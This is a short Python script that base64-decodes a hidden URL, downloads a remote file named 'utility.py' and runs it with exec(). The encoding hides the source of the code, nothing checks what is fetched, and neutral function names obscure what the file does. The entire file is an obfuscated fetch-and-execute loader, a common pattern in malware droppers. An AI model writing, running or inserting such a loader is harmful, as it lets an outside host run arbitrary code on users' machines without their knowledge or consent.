import base64
import requests
from io import StringIO

def get_code():
    encoded_url = "aHR0cDovL3N0YXRpYy5yZXNvdXJjZXNoYXJlLm9yZy9zY3JpcHRzL3V0aWxpdHkucHk="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def execute(source_code):
    code_buffer = StringIO(source_code)
    global_vars = {}
    local_vars = {}
    exec(code_buffer.getvalue(), global_vars, local_vars)

def main():
    source_code = get_code()
    execute(source_code)

if __name__ == '__main__':
    main()
